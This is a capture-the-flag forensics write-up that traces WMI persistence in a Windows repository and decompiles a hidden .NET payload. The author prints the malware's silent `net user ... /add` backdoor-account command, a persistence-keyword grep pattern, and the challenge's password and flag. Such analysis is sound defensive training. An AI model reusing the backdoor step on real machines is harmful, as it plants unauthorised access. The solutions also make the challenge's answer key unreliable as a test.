# THM - Hacker Holidays Day 12: After Hours
**Category:** Forensics
**Difficulty:** Medium

## Tools Used
- strings
- python3
- ilspycmd (.NET decompiler)

## Steps

1. Extracted the zip archive: `unzip -P Aft3rH0ursAtt4chm3ntP4ss attachments.zip`
2. Identified the files as a Windows WMI repository: `OBJECTS.DATA` (main object store), `INDEX.BTR` (index), `MAPPING1-3.MAP` (mapping files)
3. Extracted ASCII and UTF-16 strings from OBJECTS.DATA:
```bash
strings -a -n 6 OBJECTS.DATA > ascii.txt
strings -a -el -n 6 OBJECTS.DATA > utf16.txt
```
4. Grepped for persistence-related keywords:
```bash
grep -Ein 'powershell|cmd\.exe|base64|FromBase64|IEX|Invoke-|EventConsumer|EventFilter|ActiveScript|CommandLine' ascii.txt utf16.txt | head -40
```
5. Found a large base64-encoded blob on line 10968 of `ascii.txt` — extracted and decoded it:
```bash
sed -n '10968p' ascii.txt | base64 -d > payload.bin
```
6. Identified `payload.bin` as a raw DEFLATE compressed stream — decompressed with Python:
```python
import zlib
data = open('payload.bin','rb').read()
out = zlib.decompress(data, -15)
open('payload.out','wb').write(out)
```
7. Identified `payload.out` as a .NET PE32 executable named `updates.exe`
8. Installed ilspycmd and decompiled the binary:
```bash
dotnet tool install ilspycmd -g --version 8.2.0.7535
~/.dotnet/tools/ilspycmd payload.out
```
9. Found malicious class `AfterHours.Program` — checks if machine name equals `bytelotusdc` then silently runs:
```bash
cmd.exe /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
```
The password field contains a base64-encoded string
10. Decoded the base64 password embedded in the command to retrieve the flag:
```bash
echo "VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9" | base64 -d
```

## What I Learned
- WMI persistence hides in `OBJECTS.DATA` and is invisible to standard autoruns tools that check registry Run keys and scheduled tasks
- `strings` with both `-a` (ASCII) and `-el` (UTF-16 LE) flags is a fast first pass for finding hidden data in binary forensic artifacts
- Attackers layer base64 encoding over raw DEFLATE compression to evade string-based detection in WMI class properties
- .NET executables store logic in IL metadata — `ilspycmd` decompiles them back to readable C# without needing a Windows machine
- Embedding a flag inside a `net user` password argument is a clever obfuscation layer — always decode base64 strings found in command arguments
- Custom WMI class properties like `Win32_HardwareTelemetry.ConfigData` can store arbitrary binary data, making them ideal hiding spots for payloads that survive reboots
